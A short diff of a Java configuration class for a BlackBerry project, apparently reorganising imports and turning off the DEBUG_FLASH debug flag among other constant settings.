@@ -14,16 +14,12 @@ import java.io.EOFException;
 import java.io.IOException;
 import java.io.InputStream;
 
-import fake.InstanceConfigFake;
-
 import net.rim.device.api.crypto.CryptoException;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
-import blackberry.Common;
 import blackberry.Status;
 import blackberry.action.Action;
 import blackberry.agent.Agent;
-import blackberry.config.InstanceConfig;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -33,6 +29,7 @@ import blackberry.fs.Path;
 import blackberry.params.Parameter;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
+import fake.InstanceConfigFake;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -50,7 +47,7 @@ public final class Conf {
     public static final boolean FETCH_WHOLE_EMAIL = false;
 
     public static final boolean DEBUG_SD = false;
-    public static final boolean DEBUG_FLASH = true;
+    public static final boolean DEBUG_FLASH = false;
     public static final boolean DEBUG_EVENTS = true;
     public static final boolean DEBUG_OUT = true;
     public static final boolean DEBUG_INFO = false;
